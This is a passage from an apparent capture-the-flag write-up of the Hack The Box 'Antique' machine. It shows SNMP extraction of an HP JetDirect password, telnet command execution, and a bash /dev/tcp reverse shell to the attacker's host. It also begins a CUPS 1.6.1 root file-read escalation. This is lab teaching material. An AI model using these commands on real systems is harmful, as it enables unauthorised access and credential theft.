</span></span><span class=line><span class=cl>&lt;TD <span class=nv>CLASS</span><span class=o>=</span><span class=s2>&#34;unsel&#34;</span>&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;/printers/&#34;</span>&gt;<span class=p>&amp;</span>nbsp<span class=p>;&amp;</span>nbsp<span class=p>;</span>Printers<span class=p>&amp;</span>nbsp<span class=p>;&amp;</span>nbsp<span class=p>;</span>&lt;/A&gt;&lt;/TD&gt;
</span></span><span class=line><span class=cl>&lt;TD <span class=nv>CLASS</span><span class=o>=</span><span class=s2>&#34;unsel&#34;</span> <span class=nv>WIDTH</span><span class=o>=</span><span class=s2>&#34;100%&#34;</span>&gt;&lt;FORM <span class=nv>ACTION</span><span class=o>=</span><span class=s2>&#34;/help/&#34;</span> <span class=nv>METHOD</span><span class=o>=</span><span class=s2>&#34;GET&#34;</span>&gt;&lt;INPUT
</span></span><span class=line><span class=cl><span class=nv>TYPE</span><span class=o>=</span><span class=s2>&#34;SEARCH&#34;</span> <span class=nv>NAME</span><span class=o>=</span><span class=s2>&#34;QUERY&#34;</span> <span class=nv>SIZE</span><span class=o>=</span><span class=s2>&#34;20&#34;</span> <span class=nv>PLACEHOLDER</span><span class=o>=</span><span class=s2>&#34;Search Help&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>AUTOSAVE</span><span class=o>=</span><span class=s2>&#34;org.cups.help&#34;</span> <span class=nv>RESULTS</span><span class=o>=</span><span class=s2>&#34;20&#34;</span>&gt;&lt;/FORM&gt;&lt;/TD&gt;
</span></span><span class=line><span class=cl>&lt;TD&gt;&lt;IMG <span class=nv>SRC</span><span class=o>=</span><span class=s2>&#34;/images/right.gif&#34;</span> <span class=nv>WIDTH</span><span class=o>=</span><span class=s2>&#34;4&#34;</span> <span class=nv>HEIGHT</span><span class=o>=</span><span class=s2>&#34;36&#34;</span> <span class=nv>ALT</span><span class=o>=</span><span class=s2>&#34;&#34;</span>&gt;&lt;/TD&gt;
</span></span><span class=line><span class=cl>&lt;/TR&gt;
</span></span><span class=line><span class=cl>&lt;/TABLE&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;TABLE <span class=nv>CLASS</span><span class=o>=</span><span class=s2>&#34;indent&#34;</span> <span class=nv>SUMMARY</span><span class=o>=</span><span class=s2>&#34;&#34;</span>&gt;
</span></span><span class=line><span class=cl>&lt;TR&gt;&lt;TD <span class=nv>STYLE</span><span class=o>=</span><span class=s2>&#34;padding-right: 20px;&#34;</span>&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;H1&gt;CUPS 1.6.1&lt;/H1&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;CUPS is the standards-based, open <span class=nb>source</span> printing system developed by
</span></span><span class=line><span class=cl>&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;http://www.apple.com/&#34;</span>&gt;Apple Inc.&lt;/A&gt; <span class=k>for</span> OS&lt;SUP&gt;<span class=p>&amp;</span>reg<span class=p>;</span>&lt;/SUP&gt; X and
</span></span><span class=line><span class=cl>other UNIX&lt;SUP&gt;<span class=p>&amp;</span>reg<span class=p>;</span>&lt;/SUP&gt;-like operating systems.&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;/TD&gt;
</span></span><span class=line><span class=cl>&lt;TD&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;http://www.cups.org/&#34;</span>&gt;&lt;IMG <span class=nv>SRC</span><span class=o>=</span><span class=s2>&#34;images/cups-icon.png&#34;</span> <span class=nv>WIDTH</span><span class=o>=</span><span class=s2>&#34;128&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>HEIGHT</span><span class=o>=</span><span class=s2>&#34;128&#34;</span> <span class=nv>ALT</span><span class=o>=</span><span class=s2>&#34;CUPS&#34;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span></span><span class=line><span class=cl>&lt;/TR&gt;
</span></span><span class=line><span class=cl>&lt;/TABLE&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;TABLE <span class=nv>CLASS</span><span class=o>=</span><span class=s2>&#34;indent&#34;</span> <span class=nv>SUMMARY</span><span class=o>=</span><span class=s2>&#34;&#34;</span>&gt;
</span></span><span class=line><span class=cl>&lt;TR&gt;&lt;TD <span class=nv>VALIGN</span><span class=o>=</span><span class=s2>&#34;top&#34;</span> <span class=nv>STYLE</span><span class=o>=</span><span class=s2>&#34;border-right: dotted thin #cccccc; padding-right: 20px;&#34;</span>&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;H2&gt;CUPS <span class=k>for</span> Users&lt;/H2&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;help/overview.html&#34;</span>&gt;Overview of CUPS&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;help/options.html&#34;</span>&gt;Command-Line Printing and Options&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;help/whatsnew.html&#34;</span>&gt;What<span class=err>&#39;</span>s New in CUPS 1.6&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;http://www.cups.org/newsgroups.php?gcups.general&#34;</span>&gt;User Forum&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;/TD&gt;&lt;TD <span class=nv>VALIGN</span><span class=o>=</span><span class=s2>&#34;top&#34;</span> <span class=nv>STYLE</span><span class=o>=</span><span class=s2>&#34;border-right: dotted thin #cccccc; padding-left: 20px; padding-right: 20px;&#34;</span>&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;H2&gt;CUPS <span class=k>for</span> Administrators&lt;/H2&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;admin&#34;</span>&gt;Adding Printers and Classes&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;help/policies.html&#34;</span>&gt;Managing Operation Policies&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;help/accounting.html&#34;</span>&gt;Printer Accounting Basics&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;help/security.html&#34;</span>&gt;Server Security&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;help/kerberos.html&#34;</span>&gt;Using Kerberos Authentication&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;help/network.html&#34;</span>&gt;Using Network Printers&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;help/ref-cupsd-conf.html&#34;</span>&gt;cupsd.conf Reference&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;http://www.cups.org/ppd.php&#34;</span>&gt;Find Printer Drivers&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;/TD&gt;&lt;TD <span class=nv>VALIGN</span><span class=o>=</span><span class=s2>&#34;top&#34;</span> <span class=nv>STYLE</span><span class=o>=</span><span class=s2>&#34;padding-left: 20px;&#34;</span>&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;H2&gt;CUPS <span class=k>for</span> Developers&lt;/H2&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;help/api-overview.html&#34;</span>&gt;Introduction to CUPS Programming&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;help/api-cups.html&#34;</span>&gt;CUPS API&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;help/api-filter.html&#34;</span>&gt;Filter and Backend Programming&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;help/api-httpipp.html&#34;</span>&gt;HTTP and IPP APIs&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;help/api-ppd.html&#34;</span>&gt;PPD API&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;help/api-raster.html&#34;</span>&gt;Raster API&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;help/ref-ppdcfile.html&#34;</span>&gt;PPD Compiler Driver Information File Reference&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;P&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;http://www.cups.org/newsgroups.php?gcups.development&#34;</span>&gt;Developer Forum&lt;/A&gt;&lt;/P&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;/TD&gt;&lt;/TR&gt;
</span></span><span class=line><span class=cl>&lt;/TABLE&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;/TD&gt;&lt;/TR&gt;
</span></span><span class=line><span class=cl>&lt;TR&gt;&lt;TD&gt;<span class=p>&amp;</span>nbsp<span class=p>;</span>&lt;/TD&gt;&lt;/TR&gt;
</span></span><span class=line><span class=cl>&lt;TR&gt;&lt;TD <span class=nv>CLASS</span><span class=o>=</span><span class=s2>&#34;trailer&#34;</span>&gt;CUPS and the CUPS logo are trademarks of
</span></span><span class=line><span class=cl>&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;http://www.apple.com&#34;</span>&gt;Apple Inc.&lt;/A&gt; CUPS is copyright 2007-2012 Apple
</span></span><span class=line><span class=cl>Inc. All rights reserved.&lt;/TD&gt;&lt;/TR&gt;
</span></span><span class=line><span class=cl>&lt;/TABLE&gt;
</span></span><span class=line><span class=cl>&lt;/BODY&gt;
</span></span><span class=line><span class=cl>&lt;/HTML&gt;
</span></span></code></pre></div><p>According to <a href=https://stackoverflow.com/questions/54806076/cups-bad-request>this thread</a> on StackOverflow, CUPS only allows connection from localhost. But that&rsquo;s a bit weird because the server answered the GET request I sent from netcat.</p><p><div class=img-container><img src=imgs/image-20211016040515575.png alt=image-20211016040515575></div></p><p>So I modified my HTTP host header value to 127.0.0.1 with <a href=https://addons.mozilla.org/en-US/firefox/addon/modify-header-value/>this extension</a>, and then I refreshed the page.</p><p><div class=img-container><img src=imgs/image-20211016040848654.png alt=image-20211016040848654></div></p><p>It worked 😮.</p><p>Among all the menus, &ldquo;administration&rdquo; is the one that&rsquo;s interesting.</p><p><div class=img-container><img src=imgs/image-20211016041744700.png alt=image-20211016041744700></div></p><p>I can access all the buttons, including the edit configuration file button , but to modify the config, I will need a valid credentials.</p><p><div class=img-container><img src=imgs/image-20211016043606267.png alt=image-20211016043606267></div></p><h3 id=tcp-9797---cups>TCP 9797 - CUPS<a class=anchor aria-hidden=true href=#tcp-9797---cups>#</a></h3><p>This port also an HTTP server, so I can use <code>netcat</code> as well, but then the response looks familiar.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «antique» «10.10.14.13» 
</span></span><span class=line><span class=cl>$ nc -vn 10.10.11.107 <span class=m>9797</span>
</span></span><span class=line><span class=cl><span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.107<span class=o>]</span> <span class=m>9797</span> <span class=o>(</span>?<span class=o>)</span> open
</span></span><span class=line><span class=cl>GET /
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HTTP/0.9 <span class=m>200</span> OK 
</span></span><span class=line><span class=cl>Date: Fri, <span class=m>15</span> Oct <span class=m>2021</span> 21:18:29 GMT
</span></span><span class=line><span class=cl>Server: CUPS/1.6
</span></span><span class=line><span class=cl>Content-Language: en_US
</span></span><span class=line><span class=cl>Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
</span></span><span class=line><span class=cl>Last-Modified: Thu, <span class=m>13</span> May <span class=m>2021</span> 05:36:41 GMT
</span></span><span class=line><span class=cl>Content-Length: <span class=m>3792</span>
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><p>Turns out that this port return the same response as on port 9090.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «antique» «10.10.14.13» 
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> -e <span class=s1>&#39;GET /\n&#39;</span> <span class=p>|</span> nc -vn 10.10.11.107 <span class=m>9797</span> &gt; /dev/null <span class=p>|</span> wc -c <span class=o>&amp;&amp;</span> <span class=nb>echo</span> -e <span class=s1>&#39;GET /\n&#39;</span> <span class=p>|</span> nc -vn 10.10.11.107 <span class=m>9090</span> &gt; /dev/null <span class=p>|</span> wc -c
</span></span><span class=line><span class=cl><span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.107<span class=o>]</span> <span class=m>9797</span> <span class=o>(</span>?<span class=o>)</span> open
</span></span><span class=line><span class=cl><span class=m>3999</span>
</span></span><span class=line><span class=cl><span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.107<span class=o>]</span> <span class=m>9090</span> <span class=o>(</span>?<span class=o>)</span> open
</span></span><span class=line><span class=cl><span class=m>3999</span>
</span></span></code></pre></div><h3 id=udp-161---snmp>UDP 161 - SNMP<a class=anchor aria-hidden=true href=#udp-161---snmp>#</a></h3><p>I recently had encountered SNMP in <a href=hackthebox/pit/>HTB: Pit</a>, so since it&rsquo;s hierarchical, I tried to do something like path traversal, and here&rsquo;s what I got:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «antique» «10.10.14.13» 
</span></span><span class=line><span class=cl>$ snmpwalk -v 2c -c public 10.10.11.107                                 
</span></span><span class=line><span class=cl>iso.3.6.1.2.1 <span class=o>=</span> STRING: <span class=s2>&#34;HTB Printer&#34;</span>
</span></span><span class=line><span class=cl>→ kali@kali «antique» «10.10.14.13» 
</span></span><span class=line><span class=cl>$ snmpwalk -v 2c -c public 10.10.11.107 iso.3.6.1.2                  
</span></span><span class=line><span class=cl>iso.3.6.1.2.1 <span class=o>=</span> STRING: <span class=s2>&#34;HTB Printer&#34;</span>
</span></span><span class=line><span class=cl>→ kali@kali «antique» «10.10.14.13» 
</span></span><span class=line><span class=cl>$ snmpwalk -v 2c -c public 10.10.11.107 iso.3.6.1  
</span></span><span class=line><span class=cl>iso.3.6.1.2.1 <span class=o>=</span> STRING: <span class=s2>&#34;HTB Printer&#34;</span>
</span></span><span class=line><span class=cl>iso.3.6.1.4.1.11.2.3.9.1.1.13.0 <span class=o>=</span> BITS: <span class=m>50</span> <span class=m>40</span> <span class=m>73</span> <span class=m>73</span> <span class=m>77</span> <span class=m>30</span> <span class=m>72</span> <span class=m>64</span> <span class=m>40</span> <span class=m>31</span> <span class=m>32</span> <span class=m>33</span> <span class=m>21</span> <span class=m>21</span> <span class=m>31</span> <span class=m>32</span> 
</span></span><span class=line><span class=cl><span class=m>33</span> <span class=m>1</span> <span class=m>3</span> <span class=m>9</span> <span class=m>17</span> <span class=m>18</span> <span class=m>19</span> <span class=m>22</span> <span class=m>23</span> <span class=m>25</span> <span class=m>26</span> <span class=m>27</span> <span class=m>30</span> <span class=m>31</span> <span class=m>33</span> <span class=m>34</span> <span class=m>35</span> <span class=m>37</span> <span class=m>38</span> <span class=m>39</span> <span class=m>42</span> <span class=m>43</span> <span class=m>49</span> <span class=m>50</span> <span class=m>51</span> <span class=m>54</span> <span class=m>57</span> <span class=m>58</span> <span class=m>61</span> <span class=m>65</span> <span class=m>74</span> <span class=m>75</span> <span class=m>79</span> <span class=m>82</span> <span class=m>83</span> <span class=m>86</span> <span class=m>90</span> <span class=m>91</span> <span class=m>94</span> <span class=m>95</span> <span class=m>98</span> <span class=m>103</span> <span class=m>106</span> <span class=m>111</span> <span class=m>114</span> <span class=m>115</span> <span class=m>119</span> <span class=m>122</span> <span class=m>123</span> <span class=m>126</span> <span class=m>130</span> <span class=m>131</span> <span class=m>134</span> <span class=m>135</span> 
</span></span></code></pre></div><p>The last response is interesting, and it&rsquo;s a password.</p><p><div class=img-container><img src=imgs/image-20211016051117785.png alt=image-20211016051117785></div></p><p>According to <a href=https://book.hacktricks.xyz/pentesting/pentesting-printers/credentials-disclosure-brute-force>HackTrick</a>, it&rsquo;s a vulnerable OID that will returns printer&rsquo;s password when queried.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «antique» «10.10.14.13» 
</span></span><span class=line><span class=cl>$ snmpwalk -v 2c -c public 10.10.11.107 iso.3.6.1.4.1.11.2.3.9.1.1.13.0
</span></span><span class=line><span class=cl>iso.3.6.1.4.1.11.2.3.9.1.1.13.0 <span class=o>=</span> BITS: <span class=m>50</span> <span class=m>40</span> <span class=m>73</span> <span class=m>73</span> <span class=m>77</span> <span class=m>30</span> <span class=m>72</span> <span class=m>64</span> <span class=m>40</span> <span class=m>31</span> <span class=m>32</span> <span class=m>33</span> <span class=m>21</span> <span class=m>21</span> <span class=m>31</span> <span class=m>32</span> 
</span></span><span class=line><span class=cl><span class=m>33</span> <span class=m>1</span> <span class=m>3</span> <span class=m>9</span> <span class=m>17</span> <span class=m>18</span> <span class=m>19</span> <span class=m>22</span> <span class=m>23</span> <span class=m>25</span> <span class=m>26</span> <span class=m>27</span> <span class=m>30</span> <span class=m>31</span> <span class=m>33</span> <span class=m>34</span> <span class=m>35</span> <span class=m>37</span> <span class=m>38</span> <span class=m>39</span> <span class=m>42</span> <span class=m>43</span> <span class=m>49</span> <span class=m>50</span> <span class=m>51</span> <span class=m>54</span> <span class=m>57</span> <span class=m>58</span> <span class=m>61</span> <span class=m>65</span> <span class=m>74</span> <span class=m>75</span> <span class=m>79</span> <span class=m>82</span> <span class=m>83</span> <span class=m>86</span> <span class=m>90</span> <span class=m>91</span> <span class=m>94</span> <span class=m>95</span> <span class=m>98</span> <span class=m>103</span> <span class=m>106</span> <span class=m>111</span> <span class=m>114</span> <span class=m>115</span> <span class=m>119</span> <span class=m>122</span> <span class=m>123</span> <span class=m>126</span> <span class=m>130</span> <span class=m>131</span> <span class=m>134</span> <span class=m>135</span>
</span></span></code></pre></div><h3 id=finding-vulnerabilities>Finding Vulnerabilities<a class=anchor aria-hidden=true href=#finding-vulnerabilities>#</a></h3><p>I couldn&rsquo;t determine the FTP version, but for port 9797 and 9090, it&rsquo;s revealed that they are using the same version of CUPS, which is 1.6.1. If you notice the copyright at the bottom (2007-2012), the CUPS version seems pretty old.</p><p>Throwing CUPS on <code>searchsploit</code> pops up a bunch of exploits, but on Google, there is a metasploit module for 1.6.1: <a href=https://www.rapid7.com/db/modules/post/multi/escalate/cups_root_file_read/>File Read vulnerability</a>.</p><p><div class=img-container><img src=imgs/image-20211016043745272.png alt=image-20211016043745272></div></p><p>To use that module I&rsquo;ll need a system access first.</p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-lp>Shell as lp<a class=anchor aria-hidden=true href=#shell-as-lp>#</a></h3><h4 id=ftp-access>FTP Access<a class=anchor aria-hidden=true href=#ftp-access>#</a></h4><p>The password I obtained from SNMP enumeration works on FTP.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «antique» «10.10.14.13» 
</span></span><span class=line><span class=cl>$ nc -vn 10.10.11.107 <span class=m>23</span>  
</span></span><span class=line><span class=cl><span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.107<span class=o>]</span> <span class=m>23</span> <span class=o>(</span>telnet<span class=o>)</span> open
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HP JetDirect
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Password: P@ssw0rd@123!!123
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Please <span class=nb>type</span> <span class=s2>&#34;?&#34;</span> <span class=k>for</span> HELP
</span></span><span class=line><span class=cl>&gt; ?
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>To Change/Configure Parameters Enter:
</span></span><span class=line><span class=cl>Parameter-name: value &lt;Carriage Return&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Parameter-name Type of value
</span></span><span class=line><span class=cl>ip: IP-address in dotted notation
</span></span><span class=line><span class=cl>subnet-mask: address in dotted notation <span class=o>(</span>enter <span class=m>0</span> <span class=k>for</span> default<span class=o>)</span>
</span></span><span class=line><span class=cl>default-gw: address in dotted notation <span class=o>(</span>enter <span class=m>0</span> <span class=k>for</span> default<span class=o>)</span>
</span></span><span class=line><span class=cl>syslog-svr: address in dotted notation <span class=o>(</span>enter <span class=m>0</span> <span class=k>for</span> default<span class=o>)</span>
</span></span><span class=line><span class=cl>idle-timeout: seconds in integers
</span></span><span class=line><span class=cl>set-cmnty-name: alpha-numeric string <span class=o>(</span><span class=m>32</span> chars max<span class=o>)</span>
</span></span><span class=line><span class=cl>host-name: alpha-numeric string <span class=o>(</span>upper <span class=k>case</span> only, <span class=m>32</span> chars max<span class=o>)</span>
</span></span><span class=line><span class=cl>dhcp-config: <span class=m>0</span> to disable, <span class=m>1</span> to <span class=nb>enable</span>
</span></span><span class=line><span class=cl>allow: &lt;ip&gt; <span class=o>[</span>mask<span class=o>]</span> <span class=o>(</span><span class=m>0</span> to clear, list to display, <span class=m>10</span> max<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>addrawport: &lt;TCP port num&gt; <span class=o>(</span>&lt;TCP port num&gt; 3000-9000<span class=o>)</span>
</span></span><span class=line><span class=cl>deleterawport: &lt;TCP port num&gt;
</span></span><span class=line><span class=cl>listrawport: <span class=o>(</span>No parameter required<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>exec: execute system commands <span class=o>(</span><span class=nb>exec</span> id<span class=o>)</span>
</span></span><span class=line><span class=cl>exit: quit from telnet session
</span></span><span class=line><span class=cl>&gt;
</span></span></code></pre></div><p>Since it allows me to execute system commands, I can read the user flag directly from FTP.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>&gt; <span class=nb>exec</span> id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>7<span class=o>(</span>lp<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>7<span class=o>(</span>lp<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>7<span class=o>(</span>lp<span class=o>)</span>,19<span class=o>(</span>lpadmin<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nb>exec</span> ls -l
</span></span><span class=line><span class=cl>total <span class=m>8</span>
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> lp   lp <span class=m>1959</span> Sep <span class=m>27</span> 07:12 telnet.py
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root lp   <span class=m>33</span> Oct <span class=m>15</span> 05:14 user.txt
</span></span><span class=line><span class=cl>&gt; <span class=nb>exec</span> cat user.txt
</span></span><span class=line><span class=cl>a2aeb10a550bd9c53c2213491432ad52
</span></span></code></pre></div><h4 id=reverse-shell>Reverse Shell<a class=anchor aria-hidden=true href=#reverse-shell>#</a></h4><p>I will execute the reverse shell command, and catch it on my nc listener</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>&gt; <span class=nb>exec</span> which bash
</span></span><span class=line><span class=cl>/usr/bin/bash
</span></span><span class=line><span class=cl>&gt; <span class=nb>exec</span> bash -c <span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.13/53 0&gt;&amp;1&#34;</span>
</span></span></code></pre></div><p>On my listener:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «antique» «10.10.14.13» 
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>53</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>53</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.13<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.107<span class=o>]</span> <span class=m>45184</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>821<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>lp@antique:~$ python3 -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>python3 -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>lp@antique:~$ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl>lp@antique:~$ ^Z
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>  + <span class=m>9729</span> suspended  nc -nvlp <span class=m>53</span>
</span></span><span class=line><span class=cl>→ kali@kali «antique» «10.10.14.13» 
</span></span><span class=line><span class=cl>$ stty raw -echo<span class=p>;</span><span class=nb>fg</span>
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>  + <span class=m>9729</span> continued  nc -nvlp <span class=m>53</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>lp@antique:~$ 
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=file-read>File read<a class=anchor aria-hidden=true href=#file-read>#</a></h3><h4 id=cups-root-file-read>CUPS Root File read<a class=anchor aria-hidden=true href=#cups-root-file-read>#</a></h4><p>The description of the metasploit module for the file read vulnerability on CUPS 1.6.1 states that:</p><blockquote><p>This module exploits a vulnerability in CUPS &lt; 1.6.2, an open source printing system. CUPS allows members of the <strong>lpadmin group</strong> to make changes to the cupsd.conf configuration. When the user visits the Error Log page in the web interface, the cupsd daemon (running with setuid root) reads the Error Log path and echoes it as plaintext. &mldr;[SNIP]&mldr;</p></blockquote><p>Now since I&rsquo;ve a shell session as <strong>lpadmin</strong>, I can try to exploit the file read vulnerability manually.</p><p>Not sure if it was exposed by other players with <code>socat</code> to external, but the CUPS web interface is originally listening on localhost 631.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>lp@antique:/home/lp$ netstat -tlpn
</span></span><span class=line><span class=cl><span class=o>(</span>Not all processes could be identified, non-owned process info
</span></span><span class=line><span class=cl> will not be shown, you would have to be root to see it all.<span class=o>)</span>
</span></span><span class=line><span class=cl>Active Internet connections <span class=o>(</span>only servers<span class=o>)</span>
</span></span><span class=line><span class=cl>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:23              0.0.0.0:*               LISTEN      828/python3         
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:9090            0.0.0.0:*               LISTEN      19247/socat         
